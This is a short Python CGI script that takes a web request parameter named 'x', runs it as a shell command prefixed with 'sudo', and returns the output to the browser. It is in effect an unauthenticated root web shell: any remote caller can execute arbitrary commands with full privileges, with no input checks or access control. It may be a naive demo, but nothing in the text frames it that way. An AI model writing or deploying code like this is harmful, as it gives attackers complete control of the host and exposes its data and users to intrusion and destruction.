#!/usr/bin/python3


import subprocess
import cgi

print("content-type: text/html")
print()

f = cgi.FieldStorage()
cmd = f.getvalue("x")

out = subprocess.getoutput("sudo " + cmd)
print(out)
